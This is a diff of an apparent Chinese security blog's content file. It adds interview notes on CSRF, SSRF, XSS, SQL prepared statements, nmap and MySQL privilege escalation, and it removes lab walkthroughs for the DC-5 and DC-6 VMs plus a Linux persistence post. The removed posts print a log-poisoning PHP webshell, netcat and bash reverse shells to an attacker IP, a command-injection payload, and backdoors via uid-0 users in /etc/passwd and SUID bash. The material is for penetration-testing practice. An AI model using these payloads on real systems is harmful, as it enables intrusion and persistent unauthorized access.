+<p>防御：<br>来自：<a class="link" href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">https://tech.meituan.com/2018/10/11/fe-security-csrf.html<i class="fas fa-external-link-alt"></i></a><br>CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。<br>CSRF的两个特点：</p>
+<ul>
+<li>CSRF（通常）发生在第三方域名。</li>
+<li>CSRF攻击者不能获取到Cookie等信息，只是使用。<br>针对这两点，我们可以专门制定防护策略，如下：</li>
+<li>阻止不明外域的访问<br>同源检测<br>Samesite Cookie</li>
+<li>提交时要求附加本域才能获取的信息<br>CSRF Token<br>双重Cookie验证<br>CSRF TOKEN：<br>CSRF Token的防护策略分为三个步骤：</li>
+</ul>
+<ol>
+<li>将CSRF Token输出到页面中</li>
+<li>页面提交的请求携带这个Token</li>
+<li>服务器验证Token是否正确</li>
+</ol>
+<h2 id="4-SSRF"><a href="#4-SSRF" class="headerlink" title="4. SSRF"></a>4. SSRF</h2><p>Server Side RequestForgery，服务器端请求伪造<br>它是一种<strong>由攻击者构造形成，由服务端发起请求</strong>的一个安全漏洞。因为它是由服务端发起的，所以它<strong>能够请求到与它相连但与外网隔离的内部系统</strong>。由于服务端提供了从其他服务器应用获取数据的功能（例如分享等功能）且没有对目标地址做过滤与限制，给予了攻击者乘虚而入的机会。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
+<p>SSRF的受害对象主要是一些服务器所连接的一些内网设备，如<strong>内网的应用程序</strong>，<strong>通过file协议获得内部网络的资料</strong>等</p>
+<p>防御：</p>
+<p>1.将URL进行解析转化成IP，并使用正则表达式表示内网网址，并以此进行URL过滤。</p>
+<p>2.建立URL白名单，只允许白名单上内容通过过滤。</p>
+<p>3.建立内网IP黑名单，阻止对该IP的请求。</p>
+<p>4.对返回内容进行过滤，减少敏感内容暴露。</p>
+<p>5.禁止不需要的协议，只允许http和https协议的请求，减少file等协议的问题。</p>
+<h2 id="5-XSS防御"><a href="#5-XSS防御" class="headerlink" title="5. XSS防御"></a>5. XSS防御</h2><p>HttpOnly 最早是由微软提出，并在 IE 6 中实现的，至今已经逐渐成为一个标准，各大浏览器都支持此标准。具体含义就是，如果某个 Cookie 带有 HttpOnly 属性，那么这一条 Cookie 将被禁止读取，也就是说，JavaScript 读取不到此条 Cookie，不过在与服务端交互的时候，Http Request 包中仍然会带上这个 Cookie 信息，即我们的正常交互不受影响。</p>
+<p>XSS的防御分输入和输出两方面<br><a class="link" href="https://juejin.cn/post/6844903684900388871#heading-7">https://juejin.cn/post/6844903684900388871#heading-7<i class="fas fa-external-link-alt"></i></a></p>
+<p>输入</p>
+<p>格式检验，例如用户名只能以字母和数字组合，手机号码只能有 11 位且全部为数字，否则即为非法。<br>白名单检测<br>匹配XSS特征</p>
+<p>输出</p>
+<p>HTMLEncode<br>JavaScriptEncode</p>
+<h2 id="6-sql预编译"><a href="#6-sql预编译" class="headerlink" title="6. sql预编译"></a>6. sql预编译</h2><p>一条sql语句的执行需要经过语义解析，制定执行计划，执行并返回结果。</p>
+<p>预编译是指把要执行的sql语句先进行一个解析,解析语法以及确定查询范围还有查找的返回结果类型，就是确定了查询的方式，把命令和参数进行了分离，使用预编译的sql语句来进行查询直接进行执行计划，不会在进行语义解析，也就是DB不会在进行编译，而是直接执行编译过的sql。只需要替换掉参数部分。</p>
+<ol>
+<li><p>预编译使用错误<br> 预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</p>
+</li>
+<li><p>部分参数不可预编译<br> 在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</p>
+</li>
+<li><p>预编译实现错误<br> 部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</p>
+</li>
+</ol>
+<h2 id="7-nmap扫码方式、种类"><a href="#7-nmap扫码方式、种类" class="headerlink" title="7. nmap扫码方式、种类"></a>7. nmap扫码方式、种类</h2><ul>
+<li>端口扫描技术</li>
+</ul>
+<p>-sS（TCP SYN 扫描/半开扫描）<br>-sT（TCP connect()扫描）<br>-sU（UDP 扫描）<br>-sN、-sF、-sX（TCP Null、FIN、Xmas 扫描）<br>-sA（TCP ACK 扫描）<br>-sW（TCP 窗口扫描）<br>-sM（TCP Maimon 扫描）<br>–scanflags（定制的 TCP 扫描）<br>-sI（Idel 扫描）<br>-sO（IP 协议扫描）<br>-b（FTP 弹跳扫描）</p>
+<ul>
+<li>服务版本探测</li>
+</ul>
+<p>-sV（版本探测）<br>–allports（不为版本探测排除任何端口）<br>–version-intensity <intensity> （设置版本扫描强度）：<br>–version-light （打开轻量级模式）：<br>–version-all （尝试每个探测）：<br>–version-trace（(跟踪版本扫描活动）：<br>-sR（RPC 扫描）</intensity></p>
+<h2 id="8-mysql的提权方式"><a href="#8-mysql的提权方式" class="headerlink" title="8. mysql的提权方式"></a>8. mysql的提权方式</h2><p><a class="link" href="https://blog.csdn.net/he_and/article/details/81434865">https://blog.csdn.net/he_and/article/details/81434865<i class="fas fa-external-link-alt"></i></a></p>
+<h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><p>1.原理<br>在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。<br>2.利用条件<br>    mysql用户具有root权限(对上面那个目录可写）<br>    关闭了secure-file-priv</p>
+<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>1.原理<br>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限<br>2.利用条件    </p>
+<ul>
+<li><p>mysql &lt;  5.0，导出路径随意。</p>
+</li>
+<li><p>5.0 &lt;= mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:/windows/system32/)</p>
+<p> 查看路径：</p>
+ <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%plugin%&#39;;</span><br></pre></td></tr></table></figure></li>
+<li><p>mysql &gt; 5.1，udf.dll 必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</p>
+</li>
+<li><p>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</p>
+</li>
+<li><p>拥有可以将udf.dll写入相应目录的权限。这一条件主要是要看 secure_file_priv的值</p>
+   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br></pre></td></tr></table></figure>
+<p>   当secure_file_priv的值为NULL或/tmp/时，此时无法提权<br>   当secure_file_priv的值没有具体值时，则可以提权</p>
+</li>
+</ul>
+<p>​    udf文件路径：</p>
+<ul>
+<li>sqlmap：sqlmap根目录/data/udf/mysql</li>
+<li>msf：MSF根目录/embedded/framework/data/exploits/mysql</li>
+<li>网页16进制：国光大佬写的<a class="link" href="https://www.sqlsec.com/tools/udf.html">https://www.sqlsec.com/tools/udf.html<i class="fas fa-external-link-alt"></i></a></li>
+</ul>
+<h2 id="9-wireshark过滤规则"><a href="#9-wireshark过滤规则" class="headerlink" title="9. wireshark过滤规则"></a>9. wireshark过滤规则</h2><h3 id="IP："><a href="#IP：" class="headerlink" title="IP："></a>IP：</h3><p>源、目的IP为xxx<br>ip.addr == 172.16.0.0/16<br>ip.src==172.16.0.0/16<br>ip.dst==192.168.0.0/16</p>
+<h3 id="端口："><a href="#端口：" class="headerlink" title="端口："></a>端口：</h3><p>方法一样，但是需要区别TCP和UDP<br>TCP.port==80<br>UDP.port==3702<br>TCP.srcport == 80<br>tcp.dstport == 80<br>……</p>
+<h3 id="协议："><a href="#协议：" class="headerlink" title="协议："></a>协议：</h3><p>协议直接输就行了<br>tcp<br>icmp<br>dns<br>snmp<br>……</p>
+<h2 id="10-宽字节注入"><a href="#10-宽字节注入" class="headerlink" title="10. 宽字节注入"></a>10. 宽字节注入</h2><p>留坑</p>
+<h2 id="11-RSA加密过程"><a href="#11-RSA加密过程" class="headerlink" title="11. RSA加密过程"></a>11. RSA加密过程</h2><p>留坑</p>
+]]></content>
   </entry>
   <entry>
     <title>（转载）  fofa语法的cms识别脚本</title>
@@ -5479,390 +5864,5 @@ insert into test1 value(3,15);
       <categories>
         <category>cnblogs</category>
       </categories>
-  </entry>
-  <entry>
-    <title>DC-5</title>
-    <url>/2021/06/07/DC-5/</url>
-    <content><![CDATA[<p>虚拟机用的NAT模式，看一下自己NAT的网卡的段<br><img src="image-20210607154654661.png" alt="image-20210607154654661"></p>
-<p>nmap找IP</p>
-<ul>
-<li>nmap 192.168.87.0/24 -sP<br><img src="image-20210607154727829.png" alt="image-20210607154727829"></li>
-</ul>
-<p>nmap扫一下端口</p>
-<ul>
-<li>nmap -Pn -sV 192.168.87.132</li>
-</ul>
-<p>PORT    STATE SERVICE VERSION<br>80/tcp  open  http    nginx 1.6.2<br>111/tcp open  rpcbind 2-4 (RPC #100000)</p>
-<p>太少了<br>再用masscan扫一下</p>
-<ul>
-<li>masscan -p0-65535 192.168.87.132<br>Discovered open port 57216/tcp on 192.168.87.132<br>Discovered open port 80/tcp on 192.168.87.132<br>Discovered open port 111/tcp on 192.168.87.132<br>没东西</li>
-</ul>
-<p>同时dirsearch扫一下目录</p>
-<ul>
-<li>python .\dirsearch.py -u <a class="link" href="http://192.168.87.132/">http://192.168.87.132/<i class="fas fa-external-link-alt"></i></a> -e php</li>
-</ul>
-<p>[15:50:10] Starting:<br>[15:50:24] 200 -    4KB - /contact.php<br>[15:50:24] 301 -  184B  - /css  -&gt;  <a class="link" href="http://192.168.87.132/css/">http://192.168.87.132/css/<i class="fas fa-external-link-alt"></i></a><br>[15:50:26] 200 -    6KB - /faq.php<br>[15:50:27] 301 -  184B  - /images  -&gt;  <a class="link" href="http://192.168.87.132/images/">http://192.168.87.132/images/<i class="fas fa-external-link-alt"></i></a><br>[15:50:27] 403 -  570B  - /images/<br>[15:50:27] 200 -    4KB - /index.php<br>[15:50:36] 200 -  852B  - /thankyou.php</p>
-<p>Task Completed</p>
-<p>xray扫出了这个<img src="image-20210607161522204.png" alt="image-20210607161522204"><br>暂时用不上</p>
-<p>去看了一下作者的视频提示<br><img src="image-20210607164231823.png" alt="image-20210607164231823"></p>
-<p><a class="link" href="https://www.five86.com/dc-5-clue.html">https://www.five86.com/dc-5-clue.html<i class="fas fa-external-link-alt"></i></a><br>有个文件包含<br><a class="link" href="http://192.168.87.132/thankyou.php?file=/etc/passwd">http://192.168.87.132/thankyou.php?file=/etc/passwd<i class="fas fa-external-link-alt"></i></a></p>
-<p>后面改了一下网卡，ip变成了192.168.101.128</p>
-<p>后续getshell思路是，执行<br>192.168.101.128/thankyou.php?<?php eval(@$_POST['a']); ?><br>在nginx中它会被记录到log日志中，日志有两种，正确的和错误的<br>文件路径分别为<br>/var/log/nginx/access.log<br>/var/log/nginx/error.log<br>在读取的是时候两个都试试，</p>
-<p>192.168.101.128/thankyou.php?file=/var/log/nginx/error.log<br>192.168.101.128/thankyou.php?file=/var/log/nginx/access.log</p>
-<p>error的连不上，<br>用access这个连上去了，但是练上去后我人就傻了</p>
-<p><img src="image-20210607222211828.png" alt="image-20210607222211828"><br>这™的是什么</p>
-<p>（蚁剑的问题，更新一下就好了）</p>
-<p>注意写数据到日志的时候要用bp，直接浏览器写会进行编码，导致数据解析不出来</p>
-<p>蚁剑连进去后，看一下各种信息，反弹shell到kali</p>
-<p>监听 nc -lvvp 4567</p>
-<p>mkfifo /tmp/bd;cat /tmp/bd | /bin/sh -i 2&gt;&amp;1 | nc 192.168.101.130 4567 &gt;/tmp/bd</p>
-<p><img src="image-20210608102329776.png" alt="image-20210608102329776"></p>
-<p><img src="image-20210608102323166.png" alt="image-20210608102323166"></p>
-<p>准备提权<br>nginx1.6.2有个提权的漏洞<br>CVE-2016-1247<br>但是用不了</p>
-<p><img src="image-20210608111816674.png" alt="image-20210608111816674"><br>少了权限</p>
-<p>用 find / -perm -u=s -type f 2&gt;/dev/null  查找一下可以用root权限运行的命令</p>
-<p>找到了screen这个，去searchsploit里找到了相应的利用文件</p>
-<p><img src="image-20210608150840541.png" alt="image-20210608150840541"></p>
-<p>把文件下载过来上传到目标/tmp目录里，直接用发现不太行</p>
-<p>直接对着文件内容，一步一步过来</p>
-<p><img src="image-20210608151059369.png" alt="image-20210608151059369"></p>
-<p><img src="image-20210608151222329.png" alt="image-20210608151222329"></p>
-<p><img src="image-20210608150655806.png" alt="image-20210608150655806"></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>DC-6</title>
-    <url>/2021/06/08/DC-6/</url>
-    <content><![CDATA[<p>dc-6<br>安装作者的说明，下载hosts文件中配置一下</p>
-<pre><code>#DC-6
-192.168.101.133 wordy
-</code></pre>
-<p><img src="image-20210608174641928.png" alt="image-20210608174641928"></p>
-<h2 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h2><p>访问，是用wordpress写的，先拿wpscan扫一下<br>不出所料，wpscan什么也没扫到</p>
-<p>这边同时用dirsearch扫目录<br>找到这个，<br><a class="link" href="http://wordy/wp-includes/">http://wordy/wp-includes/<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://wordy/wp-admin/install.php">http://wordy/wp-admin/install.php<i class="fas fa-external-link-alt"></i></a><br><a class="link" href="http://wordy/wp-admin/maint/repair.php">http://wordy/wp-admin/maint/repair.php<i class="fas fa-external-link-alt"></i></a><br>找了一圈，无果，同样是看作者提示<br>cat /usr/share/wordlists/rockyou.txt | grep k01 &gt; passwords.txt<br>去kali里找到了rockyou.txt.gz这个文件，解压<br>gzip -d rockyou.txt.gz<br>然后得到了一个passwords.txt密码文件</p>
-<h2 id="爆破用户后台"><a href="#爆破用户后台" class="headerlink" title="爆破用户后台"></a>爆破用户后台</h2><p>看到那条提示，应该是要爆破用户账号<br>bp找了一个1w的字典爆破了一下，</p>
-<p><img src="image-20210615152408119.png" alt="image-20210615152408119"></p>
-<p>graham<br>admin<br>sarah<br>mark<br>再去wpscan里爆破密码</p>
-<p>wpscan –url <a class="link" href="http://wordy/">http://wordy<i class="fas fa-external-link-alt"></i></a> -U 1 -P /root/桌面/passwords.txt</p>
-<p>等一会<br>出来一个</p>
-<p><img src="image-20210615153223679.png" alt="image-20210615153223679"></p>
-<p>mark<br>helpdesk01</p>
-<p>进去可以看到少爆破了一个用户</p>
-<p><img src="image-20210615153254802.png" alt="image-20210615153254802"></p>
-<p>jens</p>
-<h2 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h2><p>利用它的插件activity_monitor来getshell</p>
-<p><img src="image-20210615182120264.png" alt="image-20210615182120264"></p>
-<p>看了一下文档，用的是个命令执行</p>
-<p><a class="link" href="http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools">http://wordy/wp-admin/admin.php?page=plainview_activity_monitor&amp;tab=activity_tools<i class="fas fa-external-link-alt"></i></a></p>
-<p><img src="image-20210615182721023.png" alt="image-20210615182721023"></p>
-<p>在这个页面选lookup，抓包</p>
-<p>payload改为  g.cn | nc 192.168.101.130 1234 -e /bin/bash</p>
-<p><img src="image-20210615182742027.png" alt="image-20210615182742027"></p>
-<p>接收到shell</p>
-<p><img src="image-20210615182956882.png" alt="image-20210615182956882"></p>
-<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>翻来找去，在mark的用户目录下找到了一个文件</p>
-<p><img src="image-20210615183107032.png" alt="image-20210615183107032"></p>
-<p>当时扫端口时，是有22端口的，</p>
-<p><img src="image-20210615183227314.png" alt="image-20210615183227314"></p>
-<p>登录graham用户</p>
-<p>sudo -l</p>
-<p><img src="image-20210615183650315.png" alt="image-20210615183650315"></p>
-<p>顺势找到了这个文件 backups.sh,原本是用作备份网页的，<br>用 vi backups.sh 修改文件内容为 /bin/bash ，因为jens不用密码<br>然后       sudo -u jens ./backups.sh<br>就来到了jens的shell下<br>    find / -perm -u=s -type f 2&gt;/dev/null<br>没找到东西</p>
-<p><img src="image-20210615185154119.png" alt="image-20210615185154119"></p>
-<h3 id="nmap-提权"><a href="#nmap-提权" class="headerlink" title="nmap 提权"></a>nmap 提权</h3><p>sudo -l找到nmap可以用，用nmap提权<br>先写一个nse文件，root.nse<br>    os.execute(‘/bin/bash’)<br>然后sudo nmap –script=root.nse</p>
-<p><img src="image-20210615184449384.png" alt="image-20210615184449384"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个靶机几乎全是靠提示过来的,wpscan更新换代太快了,以至于找到的命令都没用了,爆破用户用的bp,爆破用户密码的时候还是自己看help搞明白的.<br>getshell的过程也挺离谱的,网上查wp后台getshell很容易,但是我却不认识activity_monitor是插件,见得太少了,<br>反弹shell我用的<br>    bash -i &gt;% /dev/tcp/192.168.101.130/1234 0&gt;%1<br>没用反应,<br>用<br>    nc 192.168.101.130 1234 -e /bin/bash<br>这个就可以,不是很明白为什么<br>后面的过程就更不用说了,倒是学会了用这两个东西来找可以提权的东西,然后再对症下药<br>find / -perm -u=s -type f 2&gt;/dev/null<br>sudo -l</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>linux权限维持</title>
-    <url>/2021/06/08/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/</url>
-    <content><![CDATA[<p>以刚刚拿下的DC-5靶机为例，测试一下各种linux权限维持的方法</p>
-<p>方法都来自：<a class="link" href="https://phyb0x.github.io/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/">https://phyb0x.github.io/2018/10/23/linux%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81-%E5%90%8E%E9%97%A8/<i class="fas fa-external-link-alt"></i></a></p>
-<p>以此记录一下</p>
-<p><img src="mbGCWWC.png" alt="mbGCWWC"></p>
-<h2 id="添加超级用户："><a href="#添加超级用户：" class="headerlink" title="添加超级用户："></a>添加超级用户：</h2><p>添加</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">useradd guest;echo &#x27;guest:123456&#x27;|chpasswd</span><br><span class="line">useradd -p `openssl passwd 123456` guest</span><br><span class="line">useradd -p &quot;$(openssl passwd 123456)&quot; guest</span><br><span class="line">useradd newuwer;echo -e &quot;123456n123456n&quot; |passwd newuser</span><br></pre></td></tr></table></figure>
-<p>设置root权限</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo &quot;guest:x:0:0::/:/bin/sh&quot; &gt;&gt; /etc/passwd</span><br><span class="line">echo &#x27;guest:123456&#x27;|chpasswd</span><br></pre></td></tr></table></figure>
-<p>实际测试中发现添加用户后，passwd文件中就存在那一条数据了，再写的话，修改不了权限，所以我这里先添加数据到passwd中，再添加用户（或者修改密码）</p>
-<p><img src="image-20210608171347277.png" alt="image-20210608171347277"></p>
-<p>除此之外，还有一个方式添加新用户，<br>先对密码就行加密<br>openssl passwd -1 -salt admin admin<br>-1 的意思是使用md5加密算法<br>-salt 自动插入一个随机数作为文件内容加密，默认选项 加点盐：<br>得到密文后，拼接为一条消息，写入到passwd文件中，这样子就不需要chpasswd了<br>    admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash<br>    echo ‘admin:$1$admin$1kgWpnZpUx.vTroWPXPIB0:0:0::/root:/bin/bash’ &gt; /etc/passwd</p>
-<p>有些时候添加不成功是因为用户策略可以适当加强密码强度<br>有些也会限制root权限用户远程登录</p>
-<h2 id="SUID-shell"><a href="#SUID-shell" class="headerlink" title="SUID shell"></a>SUID shell</h2><p>提权后，cp /bin/bash /.test<br>chmod 4755 /.test<br>之后以普通用户运行<br>/.test -p</p>
-<p><img src="image-20210608172859611.png" alt="image-20210608172859611"><br>euid:effective user ID:有效用户ID,指进程执行时对文件的访问权限</p>
-<p>后面的由于环境不合适，就没测了。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>面试题查漏补缺</title>
-    <url>/2021/06/10/%E9%9D%A2%E8%AF%95%E9%A2%98%E6%9F%A5%E6%BC%8F%E8%A1%A5%E7%BC%BA/</url>
-    <content><![CDATA[<h2 id="1-快速判断目标是Linux还是Windows"><a href="#1-快速判断目标是Linux还是Windows" class="headerlink" title="1. 快速判断目标是Linux还是Windows"></a>1. 快速判断目标是Linux还是Windows</h2><p>linux对大小写敏感，<br>win不敏感，<br>目录修改一下字母大小写，如果正常访问，大概率是win，不能就可能是linux</p>
-<h2 id="2-站库分离"><a href="#2-站库分离" class="headerlink" title="2. 站库分离"></a>2. 站库分离</h2><p><a class="link" href="https://blog.csdn.net/Vdieoo/article/details/109515514">https://blog.csdn.net/Vdieoo/article/details/109515514<i class="fas fa-external-link-alt"></i></a></p>
-<ul>
-<li><ul>
-<li>从 web 网站打入进而打站库分离的数据库，内网渗透<br>①. 从 web 入口通常就是通过网站的各种漏洞来 getshell，比如文件上传、命令执行、代码        执行、还有 SQL 注入写入一句话（into outfile、日志备份等）。<br>②. 在获得 web 权限或者有诸如文件读取等漏洞时，我们还读数据库配置文件、对数据库内        容分析、查找数据库备份，进而对数据库目标 ip 进行渗透，以便后续操作</li>
-</ul>
-</li>
-<li>从数据库打入进而打站库分离的 web 网站，内网渗透<br>①. MySql<br>（1）定位 web 端 ip 地址</li>
-</ul>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select * from information_schema.PROCESSLIST;</span><br></pre></td></tr></table></figure>
-
-<p>在得到了 web 端的 ip 我们可以进而对 web 端进行渗透。<br>（2）load_file () 获取数据库所在服务器的敏感信息<br>如果没有 secure_file_priv 参数的限制（MySQL5.7 以下）我们还可以用 load_file() 函数对文件内容进行读取。</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&#39;C:&#x2F;test.txt&#39;);</span><br></pre></td></tr></table></figure>
-
-<p>②. MsSql<br>（1） 判断是否站库分离<br>得到客户端主机名: select host_name();<br>得到服务端主机名: select @@servername;<br>根据结果判断是否分离，结果一样就可能站库同服务器，结果不一样就是站库分离。</p>
-<h2 id="3-CSRF"><a href="#3-CSRF" class="headerlink" title="3. CSRF"></a>3. CSRF</h2><p>Cross-site requestforgery，也就是跨站请求伪造<br>XSS攻击是跨站脚本攻击，CSRF攻击是请求伪造，XSS来自用户的手，完成一些操作或者是泄露信息，CSRF攻击本不是出自用户之手，却经过第三方恶意攻击者的处理，伪装成了受信任用户的“亲历亲为”。两者的关系属于 ，XSS是实现CSRF的诸多途径中的一条，但并不是唯一的一条。<br>常见的CSRF在用户修改密码的地方</p>
-<p><img src="image-20210610101822012.png" alt="image-20210610101822012"></p>
-<p>防御：<br>来自：<a class="link" href="https://tech.meituan.com/2018/10/11/fe-security-csrf.html">https://tech.meituan.com/2018/10/11/fe-security-csrf.html<i class="fas fa-external-link-alt"></i></a><br>CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。<br>CSRF的两个特点：</p>
-<ul>
-<li>CSRF（通常）发生在第三方域名。</li>
-<li>CSRF攻击者不能获取到Cookie等信息，只是使用。<br>针对这两点，我们可以专门制定防护策略，如下：</li>
-<li>阻止不明外域的访问<br>同源检测<br>Samesite Cookie</li>
-<li>提交时要求附加本域才能获取的信息<br>CSRF Token<br>双重Cookie验证<br>CSRF TOKEN：<br>CSRF Token的防护策略分为三个步骤：</li>
-</ul>
-<ol>
-<li>将CSRF Token输出到页面中</li>
-<li>页面提交的请求携带这个Token</li>
-<li>服务器验证Token是否正确</li>
-</ol>
-<h2 id="4-SSRF"><a href="#4-SSRF" class="headerlink" title="4. SSRF"></a>4. SSRF</h2><p>Server Side RequestForgery，服务器端请求伪造<br>它是一种<strong>由攻击者构造形成，由服务端发起请求</strong>的一个安全漏洞。因为它是由服务端发起的，所以它<strong>能够请求到与它相连但与外网隔离的内部系统</strong>。由于服务端提供了从其他服务器应用获取数据的功能（例如分享等功能）且没有对目标地址做过滤与限制，给予了攻击者乘虚而入的机会。比如从指定URL地址获取网页文本内容，加载指定地址的图片，下载等等。SSRF是利用存在缺陷的web应用作为代理攻击远程和本地的服务器。</p>
-<p>SSRF的受害对象主要是一些服务器所连接的一些内网设备，如<strong>内网的应用程序</strong>，<strong>通过file协议获得内部网络的资料</strong>等</p>
-<p>防御：</p>
-<p>1.将URL进行解析转化成IP，并使用正则表达式表示内网网址，并以此进行URL过滤。</p>
-<p>2.建立URL白名单，只允许白名单上内容通过过滤。</p>
-<p>3.建立内网IP黑名单，阻止对该IP的请求。</p>
-<p>4.对返回内容进行过滤，减少敏感内容暴露。</p>
-<p>5.禁止不需要的协议，只允许http和https协议的请求，减少file等协议的问题。</p>
-<h2 id="5-XSS防御"><a href="#5-XSS防御" class="headerlink" title="5. XSS防御"></a>5. XSS防御</h2><p>HttpOnly 最早是由微软提出，并在 IE 6 中实现的，至今已经逐渐成为一个标准，各大浏览器都支持此标准。具体含义就是，如果某个 Cookie 带有 HttpOnly 属性，那么这一条 Cookie 将被禁止读取，也就是说，JavaScript 读取不到此条 Cookie，不过在与服务端交互的时候，Http Request 包中仍然会带上这个 Cookie 信息，即我们的正常交互不受影响。</p>
-<p>XSS的防御分输入和输出两方面<br><a class="link" href="https://juejin.cn/post/6844903684900388871#heading-7">https://juejin.cn/post/6844903684900388871#heading-7<i class="fas fa-external-link-alt"></i></a></p>
-<p>输入</p>
-<p>格式检验，例如用户名只能以字母和数字组合，手机号码只能有 11 位且全部为数字，否则即为非法。<br>白名单检测<br>匹配XSS特征</p>
-<p>输出</p>
-<p>HTMLEncode<br>JavaScriptEncode</p>
-<h2 id="6-sql预编译"><a href="#6-sql预编译" class="headerlink" title="6. sql预编译"></a>6. sql预编译</h2><p>一条sql语句的执行需要经过语义解析，制定执行计划，执行并返回结果。</p>
-<p>预编译是指把要执行的sql语句先进行一个解析,解析语法以及确定查询范围还有查找的返回结果类型，就是确定了查询的方式，把命令和参数进行了分离，使用预编译的sql语句来进行查询直接进行执行计划，不会在进行语义解析，也就是DB不会在进行编译，而是直接执行编译过的sql。只需要替换掉参数部分。</p>
-<ol>
-<li><p>预编译使用错误<br> 预编译只是使用占位符替代的字段值的部分，如果第一次交互传入的命令使用了字符串拼接，使得命令是攻击者可控的，那么预编译不会生效。</p>
-</li>
-<li><p>部分参数不可预编译<br> 在有的情况下，数据库处理引擎会检查数据表和数据列是否存在，因此数据表名和列名不能被占位符所替代。这种情况下如果表名和列名可控，则可能引入漏洞。</p>
-</li>
-<li><p>预编译实现错误<br> 部分语言引擎在实现上存在一定问题，可能会存在绕过漏洞。</p>
-</li>
-</ol>
-<h2 id="7-nmap扫码方式、种类"><a href="#7-nmap扫码方式、种类" class="headerlink" title="7. nmap扫码方式、种类"></a>7. nmap扫码方式、种类</h2><ul>
-<li>端口扫描技术</li>
-</ul>
-<p>-sS（TCP SYN 扫描/半开扫描）<br>-sT（TCP connect()扫描）<br>-sU（UDP 扫描）<br>-sN、-sF、-sX（TCP Null、FIN、Xmas 扫描）<br>-sA（TCP ACK 扫描）<br>-sW（TCP 窗口扫描）<br>-sM（TCP Maimon 扫描）<br>–scanflags（定制的 TCP 扫描）<br>-sI（Idel 扫描）<br>-sO（IP 协议扫描）<br>-b（FTP 弹跳扫描）</p>
-<ul>
-<li>服务版本探测</li>
-</ul>
-<p>-sV（版本探测）<br>–allports（不为版本探测排除任何端口）<br>–version-intensity <intensity> （设置版本扫描强度）：<br>–version-light （打开轻量级模式）：<br>–version-all （尝试每个探测）：<br>–version-trace（(跟踪版本扫描活动）：<br>-sR（RPC 扫描）</intensity></p>
-<h2 id="8-mysql的提权方式"><a href="#8-mysql的提权方式" class="headerlink" title="8. mysql的提权方式"></a>8. mysql的提权方式</h2><p><a class="link" href="https://blog.csdn.net/he_and/article/details/81434865">https://blog.csdn.net/he_and/article/details/81434865<i class="fas fa-external-link-alt"></i></a></p>
-<h3 id="mof提权"><a href="#mof提权" class="headerlink" title="mof提权"></a>mof提权</h3><p>1.原理<br>在windows平台下，c:/windows/system32/wbem/mof/nullevt.mof这个文件会每间隔一段时间（很短暂）就会以system权限执行一次，所以，只要我们将我们先要做的事通过代码存储到这个mof文件中，就可以实现权限提升。<br>2.利用条件<br>    mysql用户具有root权限(对上面那个目录可写）<br>    关闭了secure-file-priv</p>
-<h3 id="udf提权"><a href="#udf提权" class="headerlink" title="udf提权"></a>udf提权</h3><p>1.原理<br>UDF提权是利用MYSQL的自定义函数功能，将MYSQL账号转化为系统system权限<br>2.利用条件    </p>
-<ul>
-<li><p>mysql &lt;  5.0，导出路径随意。</p>
-</li>
-<li><p>5.0 &lt;= mysql &lt; 5.1，udf.dll 则需要导出至目标服务器的系统目录 (如：c:/windows/system32/)</p>
-<p> 查看路径：</p>
- <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show variables like &#39;%plugin%&#39;;</span><br></pre></td></tr></table></figure></li>
-<li><p>mysql &gt; 5.1，udf.dll 必须要把udf.dll文件放到MySQL安装目录下的lib\plugin文件夹下才能创建自定义函数。</p>
-</li>
-<li><p>掌握mysql数据库的账户，从拥有对mysql的insert和delete权限，以创建和抛弃函数。</p>
-</li>
-<li><p>拥有可以将udf.dll写入相应目录的权限。这一条件主要是要看 secure_file_priv的值</p>
-   <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">show global variables like &#39;secure%&#39;;</span><br></pre></td></tr></table></figure>
